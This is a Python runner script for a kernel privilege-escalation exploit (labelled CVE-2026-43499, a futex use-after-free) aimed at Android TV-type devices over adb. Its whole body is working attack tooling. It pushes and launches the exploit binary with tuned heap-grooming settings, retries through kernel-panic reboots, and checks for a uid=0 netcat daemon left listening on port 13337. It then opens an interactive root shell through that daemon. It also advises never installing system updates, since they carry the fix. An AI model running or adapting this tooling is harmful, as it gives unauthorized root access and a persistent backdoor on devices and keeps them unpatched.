#!/usr/bin/env python3
"""ghostlock-tv runner - CVE-2026-43499 (futex PI use-after-free)

Run model:
  connect -> wait for adb authorization -> wait for boot ->
  fire detached -> a miss panics the box -> survive the reboot ->
  settle -> re-roll -> a hit leaves a uid=0 root daemon on :13337 ->
  drop into an interactive root shell.

No kernel filter: the exploit binary carries the offsets, so --bin
must match the target kernel. Other kernels: build from the
GhostLock family sources (see the writeup linked from the README).

Authorized security research on your own hardware only. Never install
system updates on a target: the current GKI branch HEAD carries the
upstream fix and any kernel OTA ends the exploit permanently.

Stdlib only; adb (and nc for the shell) on PATH.
"""
import argparse
import os
import pty
import shutil
import socket
import subprocess
import sys
import time

# Reclaim environment (device-proven; see the writeup linked from
# the README for what each knob is for).
ENV = ("CRED_ATTEMPTS=6 PREPARE_SLABS=32 MOVABLE_STORM_MB=128 "
       "PCP_DRAIN_BURST=24 PCP_COUNT_DRAIN_MB=8 DRAIN_KILLS=64")

ROOT_PORT = 13337
ROLL_WAIT_S = 8 * 60        # per-roll soft cap
SETTLE_S = 45               # settle between rolls (f2fs after panic)

_T0 = time.time()


def say(msg):
    """Status line with elapsed seconds. A run spans reboots; the
    elapsed prefix is what makes a failure report correlatable with
    the box's own log afterwards."""
    print("[%4ds] %s" % (time.time() - _T0, msg), flush=True)


def adb(*args, timeout=30):
    """Run adb. Never raises: the box may be mid-panic or mid-reboot,
    where adb dies, times out, or answers garbage. Callers treat any
    of that as normal control flow, not an error."""
    try:
        return subprocess.run(["adb", *args], capture_output=True,
                              text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args, returncode=124)
    except Exception:
        return subprocess.CompletedProcess(args, returncode=125)


def shell(dev, *cmd, timeout=30):
    return adb("-s", dev, "shell", *cmd, timeout=timeout)


def wait_authorized(dev):
    """Fresh boots re-show the adb authorization popup; trust does not
    survive reboot on this class of device. Click Allow when it appears."""
    say("waiting for adb authorization (click Allow on the device)...")
    for i in range(240):
        adb("connect", dev)
        if adb("-s", dev, "get-state").stdout.strip() == "device":
            say("authorized after ~%ds" % (i * 5))
            return True
        time.sleep(5)
    return False


def wait_ready(dev):
    for _ in range(120):
        if adb("-s", dev, "get-state").stdout.strip() == "device":
            if shell(dev, "getprop sys.boot_completed").stdout.strip() == "1":
                up = shell(dev, "cut -d. -f1 /proc/uptime").stdout.strip()
                say("boot complete, uptime %ss" % up)
                return True
        time.sleep(5)
    return False


def uptime(dev):
    try:
        return int(shell(dev, "cut -d. -f1 /proc/uptime",
                         timeout=10).stdout.strip() or -1)
    except Exception:
        return -1


def root_alive(ip):
    """Any successful TCP connect to the daemon port means root is live.
    The nc daemon serves ONE connection at a time and re-arms, so a busy
    daemon (connect ok, no data) is ALIVE, not dead. Never fire a second
    exploit instance onto a box that answers on this port."""
    try:
        socket.create_connection((ip, ROOT_PORT), timeout=4).close()
        return True
    except OSError:
        return False


def fire(dev, binpath):
    log = "/data/local/tmp/ghostlock.log"
    say("push: %s -> /data/local/tmp/ghostlock" % binpath)
    adb("push", binpath, "/data/local/tmp/ghostlock", timeout=60)
    shell(dev, "chmod 755 /data/local/tmp/ghostlock")
    cmd = ("cd /data/local/tmp && rm -f %s && "
           "nohup env %s ./ghostlock --cred > %s 2>&1 < /dev/null &"
           % (log, ENV, log))
    say("fire (detached): %s" % cmd)
    shell(dev, cmd, timeout=15)


def roll(dev, ip, binpath, n):
    """One exploit attempt. Returns True on hit, False on a miss (which
    is always a fatal panic; the caller survives it and re-rolls)."""
    print()
    say(">>> roll %d (env: %s)" % (n, ENV))
    fire(dev, binpath)
    t0 = time.time()
    last_up = uptime(dev)
    while time.time() - t0 < ROLL_WAIT_S:
        time.sleep(12)
        if root_alive(ip):
            say("ROOT DAEMON ALIVE on :%d" % ROOT_PORT)
            print(shell(dev, "tail -5 /data/local/tmp/ghostlock.log")
                  .stdout.rstrip())
            return True
        up = uptime(dev)
        if up < 0 or up < last_up:
            say("panic reboot (miss is fatal); surviving")
            return False
        last_up = up
        say("uptime=%ds, waiting" % up)
    say("roll timed out after %ds" % ROLL_WAIT_S)
    return False


def verify_root(ip):
    """id through the daemon. The daemon re-arms per connection."""
    try:
        s = socket.create_connection((ip, ROOT_PORT), timeout=10)
        s.sendall(b"id\nuname -r\ngetenforce\n")
        time.sleep(2)
        s.settimeout(8)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
    except OSError as e:
        say("daemon not answering: %s" % e)
        return False
    print(data.decode("utf-8", "replace").rstrip())
    if b"uid=0" not in data:
        say("daemon answered but not uid=0; unexpected")
        return False
    print()
    print("ROOT: uid=0 daemon on %s:%d (re-arms per connection)"
          % (ip, ROOT_PORT))
    print("connect any time:  nc %s %d" % (ip, ROOT_PORT))
    return True


def parse_host(host):
    """ip:port, validated once. port defaults to 5555 (adb wireless)."""
    ip, _, port = host.partition(":")
    if not ip:
        raise ValueError("--host must be ip[:port], got %r" % host)
    if port and not port.isdigit():
        raise ValueError("--host port must be numeric, got %r" % host)
    return ip, int(port or 5555), host


def preflight(binpath, want_nc):
    """Fail fast with a useful message instead of a late timeout."""
    if shutil.which("adb") is None:
        print("ERROR: adb not found on PATH (install platform-tools)")
        sys.exit(3)
    if not os.path.isfile(binpath):
        print("ERROR: exploit binary not found: %s (--bin PATH)" % binpath)
        print("  the release binary is on the repo's releases page")
        sys.exit(3)
    if want_nc and shutil.which("nc") is None:
        print("WARNING: nc not found on PATH; the interactive shell"
              " will fail. automation (--no-shell) is unaffected.")


def main():
    p = argparse.ArgumentParser(
        description="ghostlock-tv runner (CVE-2026-43499 futex PI UAF)")
    p.add_argument("--host", required=True,
                   help="adb target host:port (e.g. 192.168.1.50:5555)")
    p.add_argument("--bin", default="ghostlock",
                   help="exploit binary built for the target kernel "
                        "(default: ghostlock, the release binary)")
    p.add_argument("--rolls", type=int, default=6,
                   help="max exploit attempts (default 6)")
    p.add_argument("--no-shell", action="store_true",
                   help="do not drop into the interactive root shell")
    a = p.parse_args()

    try:
        ip, port, dev = parse_host(a.host)
    except ValueError as e:
        print("ERROR: %s" % e)
        sys.exit(2)

    preflight(a.bin, not a.no_shell)

    print()
    print("*" * 70)
    print("  ghostlock-tv - adb-to-root kernel exploit"
          " (CVE-2026-43499 futex PI UAF)")
    print("  no kernel filter: --bin must match the target kernel")
    print("  authorized research on your own hardware only")
    print("*" * 70)

    adb("connect", dev)
    if not wait_authorized(dev):
        print("device never authorized; abort")
        sys.exit(4)
    if not wait_ready(dev):
        print("device never finished booting; abort")
        sys.exit(4)
    say("kernel: %s" % shell(dev, "uname -r").stdout.strip())

    if root_alive(ip):
        say("root daemon already alive: skipping the exploit")
    else:
        for n in range(1, a.rolls + 1):
            if roll(dev, ip, a.bin, n):
                break
            say("roll %d missed; settling %ds" % (n, SETTLE_S))
            time.sleep(SETTLE_S)
            if not wait_authorized(dev):
                print("device lost authorization mid-run; abort")
                sys.exit(4)
            if not wait_ready(dev):
                print("device never came back; abort")
                sys.exit(4)
        if not root_alive(ip):
            say("FAILED: no root after %d rolls" % a.rolls)
            sys.exit(2)

    if not verify_root(ip):
        sys.exit(2)

    if a.no_shell:
        print("(--no-shell: daemon stays up; nc %s %d to return)"
              % (ip, ROOT_PORT))
        return
    print()
    print("interactive root shell: nc %s %d (type exit to leave; the"
          % (ip, ROOT_PORT))
    print("daemon re-arms, you can always reconnect)")
    print()
    pty.spawn(["nc", ip, str(ROOT_PORT)])


if __name__ == "__main__":
    main()